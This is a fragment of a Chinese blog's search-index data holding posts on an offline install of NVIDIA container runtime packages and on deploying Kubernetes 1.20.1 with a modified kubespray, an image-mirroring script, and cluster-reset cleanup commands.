--downloaddir=/tmp/nvidia ##在拷贝到没有网路的服务器上面执行以下命令 rpm -ivh libnvidia-container1-1.1.1-1.x86_64.rpm libnvidia-container-tools-1.1.1-1.x86_64.rpm rpm -ivh nvidia-container-runtime-3.2.0-1.x86_64.rpm nvidia-container-toolkit-1.1.2-2.x86_64.rpm ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/:5:0","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/"},{"categories":["K8S"],"content":"国内环境安装部署k8s","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"上周末k8s刚刚发布了1.20.1版本，抢鲜安装体验下。 由于网络原因，访问谷歌外网不是很方便，所以本文采用国内可访问的资源进行安装，资源包括：k8s二进制文件和镜像文件 安装方式采用kubespray，项目地址 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:0:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"k8s版本包 k8s社区版本发布地址如下 https://storage.googleapis.com/kubernetes-release/release/ 分别有server、node、client三种版本包二进制文件。下载方式如下： wget https://storage.googleapis.com/kubernetes-release/release/v1.20.1/kubernetes-server-linux-amd64.tar.gz wget https://storage.googleapis.com/kubernetes-release/release/v1.20.1/kubernetes-node-linux-amd64.tar.gz wget https://storage.googleapis.com/kubernetes-release/release/v1.20.1/kubernetes-client-linux-amd64.tar.gz 上面这些地址无法直接访问。可以改由下面方式下载： 通过 CHANGELOG-1.20里面的指定的位置，下载指定版本 如1.12.1 实际上，对于安装部署，只要node中的版本包即可。 wget https://storage.googleapis.com/kubernetes-release/release/v1.20.1/kubernetes-node-linux-amd64.tar.gz ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:1:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"kubespray 说明 安装脚本采用kubespray，本文使用了目前最新的release版本1.14.2 kubespray-1.14.2 只支持到了k8s1.19，所以后面我们需要修改kubespray。 首先看下kubespray关于离线安装的事项说明 如果采用离线方式安装 Configure Inventory Once all artifacts are accessible from your internal network, adjust the following variables in your inventory to match your environment: # Registry overrides gcr_image_repo: \"{{ registry_host }}\" docker_image_repo: \"{{ registry_host }}\" quay_image_repo: \"{{ registry_host }}\" kubeadm_download_url: \"{{ files_repo }}/kubernetes/{{ kube_version }}/kubeadm\" kubectl_download_url: \"{{ files_repo }}/kubernetes/{{ kube_version }}/kubectl\" kubelet_download_url: \"{{ files_repo }}/kubernetes/{{ kube_version }}/kubelet\" # etcd is optional if you **DON'T** use etcd_deployment=host etcd_download_url: \"{{ files_repo }}/kubernetes/etcd/etcd-{{ etcd_version }}-linux-amd64.tar.gz\" cni_download_url: \"{{ files_repo }}/kubernetes/cni/cni-plugins-linux-{{ image_arch }}-{{ cni_version }}.tgz\" crictl_download_url: \"{{ files_repo }}/kubernetes/cri-tools/crictl-{{ crictl_version }}-{{ ansible_system | lower }}-{{ image_arch }}.tar.gz\" # If using Calico calicoctl_download_url: \"{{ files_repo }}/kubernetes/calico/{{ calico_ctl_version }}/calicoctl-linux-{{ image_arch }}\" # CentOS/Redhat ## Docker docker_rh_repo_base_url: \"{{ yum_repo }}/docker-ce/$releasever/$basearch\" docker_rh_repo_gpgkey: \"{{ yum_repo }}/docker-ce/gpg\" ## Containerd extras_rh_repo_base_url: \"{{ yum_repo }}/centos/$releasever/extras/$basearch\" extras_rh_repo_gpgkey: \"{{ yum_repo }}/containerd/gpg\" # Fedora ## Docker docker_fedora_repo_base_url: \"{{ yum_repo }}/docker-ce/{{ ansible_distribution_major_version }}/{{ ansible_architecture }}\" docker_fedora_repo_gpgkey: \"{{ yum_repo }}/docker-ce/gpg\" ## Containerd containerd_fedora_repo_base_url: \"{{ yum_repo }}/containerd\" containerd_fedora_repo_gpgkey: \"{{ yum_repo }}/docker-ce/gpg\" # Debian ## Docker docker_debian_repo_base_url: \"{{ debian_repo }}/docker-ce\" docker_debian_repo_gpgkey: \"{{ debian_repo }}/docker-ce/gpg\" ## Containerd containerd_debian_repo_base_url: \"{{ ubuntu_repo }}/containerd\" containerd_debian_repo_gpgkey: \"{{ ubuntu_repo }}/containerd/gpg\" containerd_debian_repo_repokey: 'YOURREPOKEY' # Ubuntu ## Docker docker_ubuntu_repo_base_url: \"{{ ubuntu_repo }}/docker-ce\" docker_ubuntu_repo_gpgkey: \"{{ ubuntu_repo }}/docker-ce/gpg\" ## Containerd containerd_ubuntu_repo_base_url: \"{{ ubuntu_repo }}/containerd\" containerd_ubuntu_repo_gpgkey: \"{{ ubuntu_repo }}/containerd/gpg\" containerd_ubuntu_repo_repokey: 'YOURREPOKEY' # If using helm helm_stable_repo_url: \"{{ helm_registry }}\" 一些k8s组件程序文件，如 kubelet 保存路径如下: {{ local_release_dir }}/kubelet-{{ kube_version }}-{{ image_arch }} ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:2:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"kubespray 安装 安装python3环境 参考脚本部署Python3 安装 ansible pip3 install -r requirements.txt # 或者 # 临时指定python的pip源，进行安装 pip3 install -i https://pypi.douban.com/simple -r requirements.txt 自定义部署配置文件 # Copy ``inventory/sample`` as ``inventory/mycluster`` # cp -rfp inventory/sample inventory/mycluster cp -rfp inventory/sample inventory/deploy_cluster 接着对deploy_cluster和源码脚本进行可修改，详见下文 执行kubespray安装或卸载 # 这里我修改了自定义部署配置目录为 deploy_cluster， 并修改其中的配置参数 ansible-playbook -i inventory/deploy_cluster/inventory.ini --become --become-user=root cluster.yml -vvv # 卸载命令 ansible-playbook -i inventory/deploy_cluster/inventory.ini --become --become-user=root reset.yml -vvv ## 清理程序和文件目录 rm -rf /etc/kubernetes rm -rf /var/lib/kubelet rm -rf /etc/ssl/etcd rm -rf /var/lib/etcd rm -rf /usr/local/bin/kubectl rm -rf /etc/systemd/system/calico-node.service rm -rf /etc/systemd/system/kubelet.service rm -rf /etc/cni rm -rf /opt/cni rm -rf /var/lib/cni/cache rm -rf /etc/calico/certs systemctl stop etcd.service systemctl disable etcd.service systemctl stop calico-node.service systemctl disable calico-node.service docker stop $(docker ps -q) docker rm $(docker ps -a -q) service docker restart 卸载时 并没有清理/tmp/release，另外reset后再执行安装，会发现/usr/local/bin/下没有kubeadm，需要从安装目录把kubeadm拷贝过去 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:3:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"示例 aist_cluster环境安装和卸载 ansible版本 确认使用ansible2.9.6 安装命令 /usr/local/python3/bin/ansible-playbook -i inventory/aist_cluster/inventory.ini --become --become-user=root cluster.yml -vvvvv 卸载命令 /usr/local/python3/bin/ansible-playbook -i inventory/aist_cluster/inventory.ini --become --become-user=root reset.yml -vvvvv ## 清理程序和文件目录 rm -rf /etc/kubernetes rm -rf /var/lib/kubelet rm -rf /etc/ssl/etcd rm -rf /var/lib/etcd rm -rf /usr/local/bin/kubectl #rm -rf /etc/systemd/system/calico-node.service #rm -rf /etc/systemd/system/kubelet.service rm -rf /etc/cni rm -rf /opt/cni rm -rf /var/lib/cni/cache rm -rf /etc/calico/certs ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:3:1","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"kubespray 修改 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:4:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"脚本修改 修改点说明 ### 下载校验关闭 由于安装的是新版本1.20.原有kubespray并不支持，所以需要把其对二进制文件的下载校验关闭 把手动替换的几个程序文件的校验操作关闭 # kubeadm # sha256: \"{{ kubeadm_binary_checksum }}\" # sha256: \"{{ kubelet_binary_checksum }}\" # sha256: \"{{ kubectl_binary_checksum }}\" ### 修改下载地址包括二进制文件和镜像 ### 已有下载文件的下载关闭 把 download tasks/main.yaml download | Get kubeadm binary and list of required images 注释掉 kubespray-2.14.2\\roles\\download\\defaults\\main.yaml ---local_release_dir:/tmp/releasesdownload_cache_dir:/tmp/kubespray_cache# do not delete remote cache files after using them# NOTE: Setting this parameter to TRUE is only really useful when developing kubespraydownload_keep_remote_cache:false# Only useful when download_run_once is false: Localy cached files and images are# uploaded to kubernetes nodes. Also, images downloaded on those nodes are copied# back to the ansible runner's cache, if they are not yet preset.download_force_cache:false# Used to only evaluate vars from download roleskip_downloads:false# Optionally skip kubeadm images download#skip_kubeadm_images: falseskip_kubeadm_images:truekubeadm_images:{}# if this is set to true will only download files once. Doesn't work# on Flatcar Container Linux by Kinvolk unless the download_localhost is true and localhost# is running another OS type. Default compress level is 1 (fastest).download_run_once:falsedownload_compress:1# if this is set to true will download containerdownload_container:true# if this is set to true, uses the localhost for download_run_once mode# (requires docker and sudo to access docker). You may want this option for# local caching of docker images or for Flatcar Container Linux by Kinvolk cluster nodes.# Otherwise, uses the first node in the kube-master group to store images# in the download_run_once mode.download_localhost:false# Always pull images if set to True. Otherwise check by the repo's tag/digest.download_always_pull:false# Some problems may occur when downloading files over https proxy due to ansible bug# https://github.com/ansible/ansible/issues/32750. Set this variable to False to disable# SSL validation of get_url module. Note that kubespray will still be performing checksum validation.download_validate_certs:true# Use the first kube-master if download_localhost is not setdownload_delegate:\"{% if download_localhost %}localhost{% else %}{{ groups['kube-master'][0] }}{% endif %}\"# Arch of Docker images and needed packagesimage_arch:\"{{host_architecture | default('amd64')}}\"# Versions# add by wangb#kube_version: v1.18.10kube_version:v1.20.1kubeadm_version:\"{{ kube_version }}\"# add by wangb#etcd_version: v3.4.3etcd_version:v3.4.13# gcr and kubernetes image repo definegcr_image_repo:\"gcr.io\"kube_image_repo:\"k8s.gcr.io\"# docker image repo definedocker_image_repo:\"docker.io\"# quay image repo definequay_image_repo:\"quay.io\"# TODO(mattymo): Move calico versions to roles/network_plugins/calico/defaults# after migration to container downloadcalico_version:\"v3.15.2\"calico_ctl_version:\"{{ calico_version }}\"calico_cni_version:\"{{ calico_version }}\"calico_policy_version:\"{{ calico_version }}\"calico_typha_version:\"{{ calico_version }}\"typha_enabled:falseflannel_version:\"v0.12.0\"cni_version:\"v0.8.7\"weave_version:2.7.0pod_infra_version:\"3.2\"contiv_version:1.2.1cilium_version:\"v1.8.3\"kube_ovn_version:\"v1.3.0\"kube_router_version:\"v1.0.1\"multus_version:\"v3.6\"ovn4nfv_ovn_image_version:\"v1.0.0\"ovn4nfv_k8s_plugin_image_version:\"v1.1.0\"# Get kubernetes major version (i.e. 1.17.4 =\u003e 1.17)kube_major_version:\"{{ kube_version | regex_replace('^v([0-9])+\\\\.([0-9]+)\\\\.[0-9]+', 'v\\\\1.\\\\2') }}\"crictl_supported_versions:# add by wangbv1.20:\"v1.20.1\"v1.19:\"v1.19.0\"v1.18:\"v1.18.0\"v1.17:\"v1.17.0\"crictl_version:\"{{ crictl_supported_versions[kube_major_version] }}\"# Download URLs#kubelet_download_url: \"https://storage.googleapis.com/kubernetes-release/release/{{ kube_version }}/bin/linux/{{ image_arch }}/kubelet\"#kubectl_download_url: \"https://storage.googleapis.com/kubernetes-release/release/{{ kube_version }}/bin/linux/{{ image_a","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:4:1","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"文件服务file server 自定义文件服务file server，为kubespray提供下载文件 [root@node2 file_server]# ll tmp/kubernetes/v1.20.1/ total 306004 -rw-r--r-- 1 root root 40783872 Dec 21 17:41 calicoctl-linux-amd64 -rw-r--r-- 1 root root 39641346 Dec 21 17:41 cni-plugins-linux-amd64-v0.8.7.tgz -rw-r--r-- 1 root root 39219200 Dec 18 20:21 kubeadm -rw-r--r-- 1 root root 40230912 Dec 18 20:21 kubectl -rw-r--r-- 1 root root 113982312 Dec 18 20:21 kubelet -rw-r--r-- 1 root root 39485440 Dec 18 20:21 kube-proxy kubespray会把其中的文件下载到暂存目录/tmp/release下 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:4:2","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"下载缓存目录/tmp/release [root@node2 deploy-kube-batch]# ll /tmp/releases/ total 267444 -rwxr-xr-x 1 root root 40783872 Dec 22 17:14 calicoctl -rwxr-xr-x 1 root root 39641346 Dec 22 17:14 cni-plugins-linux-amd64-v0.8.7.tgz ###drwxr-xr-x 2 root root 6 Dec 22 17:14 images -rwxr-xr-x 1 root root 39219200 Dec 22 17:14 kubeadm-v1.20.1-amd64 -rwxr-xr-x 1 root root 40230912 Dec 22 17:14 kubectl-v1.20.1-amd64 -rwxr-xr-x 1 root root 113982312 Dec 22 17:14 kubelet-v1.20.1-amd64 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:4:3","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"命令目录文件 可以把下载后的文件 kubeadm kubectl kubelet 放置到/usr/local/bin目录下。 安装完成后的命令目录文件如下（其它文件是有kubspray下载完成的）： [root@node131 releases]# ll /usr/local/bin 总用量 206112 -rwxr-x---. 1 root root 351 12月 21 14:52 etcd -rwxr-xr-x. 1 root root 17620576 8月 25 03:22 etcdctl drwx------. 2 root root 30 12月 21 14:50 etcd-scripts -rwxr-x---. 1 root root 39219200 12月 21 15:18 kubeadm -rwxr-x---. 1 root root 40230912 12月 21 15:18 kubectl -rwxr-xr-x. 1 root root 113982312 12月 21 15:10 kubelet drwxr-xr-x. 2 kube root 6 12月 21 13:49 kubernetes-scripts 二进制文件下载 安装过程中，某些二进制文件会下载很慢或者失败，则手动下载完成后 https://github.com/containernetworking/plugins/releases/download/v0.8.7/cni-plugins-linux-amd64-v0.8.7.tgz 再把 下载 cni 部分注释掉 cni，如下： # cni:# enabled: true# file: true# version: \"{{ cni_version }}\"# dest: \"{{local_release_dir}}/cni-plugins-linux-{{ image_arch }}-{{ cni_version }}.tgz\"## sha256: \"{{ cni_binary_checksum }}\"# url: \"{{ cni_download_url }}\"# unarchive: false# owner: \"root\"# mode: \"0755\"# groups:# - k8s-cluster calicoctl下载地址 https://github.com/projectcalico/calicoctl/releases/download/v3.15.2/calicoctl-linux-amd64 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:4:4","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"k8s镜像下载 编辑下载脚本 需要按部署k8s版本修改版本参数 download_k8s_images.sh #!/bin/bash # 关闭防火墙 # setenforce 0 # systemctl stop firewalld.service # use cmd to list images # ./kubeadm config images list --kubernetes-version=v1.20.1 # origin images # k8s.gcr.io/kube-apiserver:v1.20.1 # k8s.gcr.io/kube-controller-manager:v1.20.1 # k8s.gcr.io/kube-scheduler:v1.20.1 # k8s.gcr.io/kube-proxy:v1.20.1 # k8s.gcr.io/pause:3.2 # k8s.gcr.io/etcd:3.4.13-0 # k8s.gcr.io/coredns:1.7.0 echo \"START downloading k8s.gcr.io/images...\" images=( kube-apiserver:v1.20.1 kube-controller-manager:v1.20.1 kube-scheduler:v1.20.1 kube-proxy:v1.20.1 pause:3.2 # etcd:3.4.13-0 # etcd:3.4.3 coredns:1.7.0 # requests for kubespray k8s-dns-node-cache:1.15.13 # cluster-proportional-autoscaler-amd64:1.8.1 kube-registry-proxy:0.4 #metrics-server/metrics-server:v0.3.7 # metrics v0.3.7 找不到，改用v0.3.6 # metrics-server-amd64:v0.3.6 # ingress-nginx/controller:v0.35.0 addon-resizer:1.8.11 ) for imageName in ${images[@]} ; do docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/${imageName} docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/${imageName} k8s.gcr.io/${imageName} docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/${imageName} done # custom docker pull docker pull registry.cn-hangzhou.aliyuncs.com/ringtail/cluster-proportional-autoscaler-amd64:v1.3.0 docker tag registry.cn-hangzhou.aliyuncs.com/ringtail/cluster-proportional-autoscaler-amd64:v1.3.0 k8s.gcr.io/cluster-proportional-autoscaler-amd64:v1.3.0 docker rmi registry.cn-hangzhou.aliyuncs.com/ringtail/cluster-proportional-autoscaler-amd64:v1.3.0 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6 k8s.gcr.io/metrics-server-amd64:v0.3.6 docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6 docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/nginx-ingress-controller:0.25.1 docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/nginx-ingress-controller:0.25.1 k8s.gcr.io/nginx-ingress-controller:0.25.1 docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/nginx-ingress-controller:0.25.1 # [root@node131 ~]# docker images # REPOSITORY TAG IMAGE ID CREATED SIZE # registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy v1.20.1 e3f6fcd87756 2 days ago 118MB # registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver v1.20.1 75c7f7112080 2 days ago 122MB # registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager v1.20.1 2893d78e47dc 2 days ago 116MB # registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler v1.20.1 4aa0b4397bbb 2 days ago 46.4MB # registry.cn-hangzhou.aliyuncs.com/google_containers/coredns 1.7.0 bfe3a36ebd25 6 months ago 45.2MB # registry.cn-hangzhou.aliyuncs.com/google_containers/pause 3.2 80d28bedfe5d 10 months ago 683kB # [root@node131 ~]# docker images # REPOSITORY TAG IMAGE ID CREATED SIZE # k8s.gcr.io/kube-proxy v1.20.1 e3f6fcd87756 2 days ago 118MB # k8s.gcr.io/kube-controller-manager v1.20.1 2893d78e47dc 2 days ago 116MB # k8s.gcr.io/kube-apiserver v1.20.1 75c7f7112080 2 days ago 122MB # k8s.gcr.io/kube-scheduler v1.20.1 4aa0b4397bbb 2 days ago 46.4MB # k8s.gcr.io/coredns 1.7.0 bfe3a36ebd25 6 months ago 45.2MB # k8s.gcr.io/pause 3.2 80d28bedfe5d 10 months ago 683kB echo \"END downloading k8s.gcr.io/images...\" echo \"\" echo \"\" echo \"\" echo \"START downloading quay.io/images...\" # docker pull quay-mirror.qiniu.com/coreos/flannel # docker pull quay.io/coreos/etcd:v3.4.13 echo \"END downloading quay.io/images...\" 执行脚本 bash download_k8s_images.sh ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:4:5","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"非下载方式说明 如果没有file server服务。 需要把手动把命令目录文件拷贝到/usr/local/bin kubectl kubeadm kubelet 同时把其它下载文件如网络插件cni等下载包，放到/tmp/release目录下 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:5:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"k8s相关镜像 REPOSITORY TAG IMAGE ID CREATED SIZE k8s.gcr.io/kube-proxy v1.20.1 e3f6fcd87756 4 days ago 118MB k8s.gcr.io/kube-controller-manager v1.20.1 2893d78e47dc 4 days ago 116MB k8s.gcr.io/kube-apiserver v1.20.1 75c7f7112080 4 days ago 122MB k8s.gcr.io/kube-scheduler v1.20.1 4aa0b4397bbb 4 days ago 46.4MB nginx 1.19 ae2feff98a0c 7 days ago 133MB calico/node latest 048e0ac26968 4 weeks ago 165MB kubernetesui/dashboard-amd64 v2.0.4 46d0a29c3f61 3 months ago 225MB calico/node v3.15.2 cc7508d4d2d4 4 months ago 262MB calico/cni v3.15.2 5dadc388f979 4 months ago 110MB calico/kube-controllers v3.15.2 fbbc4a1a0e98 4 months ago 52.9MB quay.io/coreos/etcd v3.4.13 d1985d404385 4 months ago 83.8MB k8s.gcr.io/addon-resizer 1.8.11 b7db21b30ad9 5 months ago 32.8MB coredns/coredns 1.7.0 bfe3a36ebd25 6 months ago 45.2MB k8s.gcr.io/coredns 1.7.0 bfe3a36ebd25 6 months ago 45.2MB kubernetesui/metrics-scraper v1.0.5 2cd72547f23f 6 months ago 36.7MB k8s.gcr.io/k8s-dns-node-cache 1.15.13 3f7a09f7cade 7 months ago 107MB k8s.gcr.io/pause 3.2 80d28bedfe5d 10 months ago 683kB k8s.gcr.io/metrics-server-amd64 v0.3.6 9dd718864ce6 14 months ago 39.9MB k8s.gcr.io/nginx-ingress-controller 0.25.1 0439eb3e11f1 16 months ago 511MB k8s.gcr.io/cluster-proportional-autoscaler-amd64 v1.3.0 33813c948942 2 years ago 45.8MB k8s.gcr.io/kube-registry-proxy 0.4 60dc18151daf 3 years ago 188MB k8s核心组件版本：1.20.1 etcd版本：3.4.13 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:6:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"k8s组件适配 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:7:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"kube-batch [root@node2 kube-batch]# ./deploy.sh configmap/kube-batch created Warning: rbac.authorization.k8s.io/v1beta1 ClusterRoleBinding is deprecated in v1.17+, unavailable in v1.22+; use rbac.authorization.k8s.io/v1 ClusterRoleBinding clusterrolebinding.rbac.authorization.k8s.io/default-sa-admin created deployment.apps/kube-batch created Warning: apiextensions.k8s.io/v1beta1 CustomResourceDefinition is deprecated in v1.16+, unavailable in v1.22+; use apiextensions.k8s.io/v1 CustomResourceDefinition customresourcedefinition.apiextensions.k8s.io/podgroups.scheduling.incubator.k8s.io created Warning: apiextensions.k8s.io/v1beta1 CustomResourceDefinition is deprecated in v1.16+, unavailable in v1.22+; use apiextensions.k8s.io/v1 CustomResourceDefinition customresourcedefinition.apiextensions.k8s.io/queues.scheduling.incubator.k8s.io created Warning: apiextensions.k8s.io/v1beta1 CustomResourceDefinition is deprecated in v1.16+, unavailable in v1.22+; use apiextensions.k8s.io/v1 CustomResourceDefinition customresourcedefinition.apiextensions.k8s.io/podgroups.scheduling.sigs.dev created Warning: apiextensions.k8s.io/v1beta1 CustomResourceDefinition is deprecated in v1.16+, unavailable in v1.22+; use apiextensions.k8s.io/v1 CustomResourceDefinition customresourcedefinition.apiextensions.k8s.io/queues.scheduling.sigs.dev created service/kube-batch-prometheus-discovery created queue.scheduling.incubator.k8s.io/default created queue.scheduling.incubator.k8s.io/emergency-queue created queue.scheduling.incubator.k8s.io/00000000000000000000000000000000 created apiextensions.k8s.io/v1beta1 需要转换为 apiextensions.k8s.io/v1 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:7:1","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"安装完成状态 [root@node2 inventory]# kubectl get po -A -owide NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES default myapp-batch-pod 1/1 Running 3 3h11m 10.233.96.8 node2 \u003cnone\u003e \u003cnone\u003e default myapp-pod 1/1 Running 17 3h53m 10.233.95.9 gpu53 \u003cnone\u003e \u003cnone\u003e kube-system calico-kube-controllers-67f55f8858-xxnrs 1/1 Running 3 18h 10.151.11.53 gpu53 \u003cnone\u003e \u003cnone\u003e kube-system calico-node-5ww7v 1/1 Running 1 17h 10.151.11.61 node2 \u003cnone\u003e \u003cnone\u003e kube-system calico-node-9fkz2 1/1 Running 2 17h 10.151.11.53 gpu53 \u003cnone\u003e \u003cnone\u003e kube-system coredns-8677555d68-bjkl2 1/1 Running 2 18h 10.233.96.5 node2 \u003cnone\u003e \u003cnone\u003e kube-system dns-autoscaler-5fb74f6dd4-wj62q 0/1 Running 2 18h 10.233.96.6 node2 \u003cnone\u003e \u003cnone\u003e kube-system kube-apiserver-node2 1/1 Running 2 18h 10.151.11.61 node2 \u003cnone\u003e \u003cnone\u003e kube-system kube-batch-56858cf46f-tmnsb 1/1 Running 0 3h25m 10.233.96.7 node2 \u003cnone\u003e \u003cnone\u003e kube-system kube-controller-manager-node2 1/1 Running 2 18h 10.151.11.61 node2 \u003cnone\u003e \u003cnone\u003e kube-system kube-proxy-77tw9 1/1 Running 2 18h 10.151.11.61 node2 \u003cnone\u003e \u003cnone\u003e kube-system kube-proxy-8vsdb 1/1 Running 3 18h 10.151.11.53 gpu53 \u003cnone\u003e \u003cnone\u003e kube-system kube-scheduler-node2 1/1 Running 2 18h 10.151.11.61 node2 \u003cnone\u003e \u003cnone\u003e kube-system kubernetes-dashboard-dfb67d98c-b8n5j 1/1 Running 4 18h 10.233.95.7 gpu53 \u003cnone\u003e \u003cnone\u003e kube-system kubernetes-metrics-scraper-54df648466-4jcc2 1/1 Running 3 18h 10.233.95.8 gpu53 \u003cnone\u003e \u003cnone\u003e kube-system nginx-proxy-gpu53 1/1 Running 3 18h 10.151.11.53 gpu53 \u003cnone\u003e \u003cnone\u003e kube-system nodelocaldns-m26kx 1/1 Running 2 18h 10.151.11.61 node2 \u003cnone\u003e \u003cnone\u003e kube-system nodelocaldns-qm62v 1/1 Running 3 18h 10.151.11.53 gpu53 \u003cnone\u003e \u003cnone\u003e [root@node2 inventory]# [root@node2 inventory]# [root@node2 inventory]# [root@node2 inventory]# kubectl get no -owide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME gpu53 Ready \u003cnone\u003e 18h v1.20.1 10.151.11.53 \u003cnone\u003e CentOS Linux 7 (Core) 3.10.0-862.el7.x86_64 docker://19.3.12 node2 Ready control-plane,master 18h v1.20.1 10.151.11.61 \u003cnone\u003e CentOS Linux 7 (Core) 3.10.0-862.el7.x86_64 docker://19.3.12 说明：dns-autoscaler没有起来，是因为其版本过低。与集群k8s版本不匹配导致，其不影响k8s组件测试 ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/:8:0","tags":["K8S"],"title":"安装部署k8s","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/"},{"categories":["K8S"],"content":"k8s1.20调度器禁用抢占 k8s1.20版本的调度抢占禁用配置，不太一样 disablePreemption.yaml apiVersion:kubescheduler.config.k8s.io/v1beta1kind:KubeSchedulerConfigurationclientConnection:kubeconfig:\"/etc/kubernetes/scheduler.conf\"profiles:- schedulerName:default-schedulerplugins:postFilter:disabled:- name:DefaultPreemption 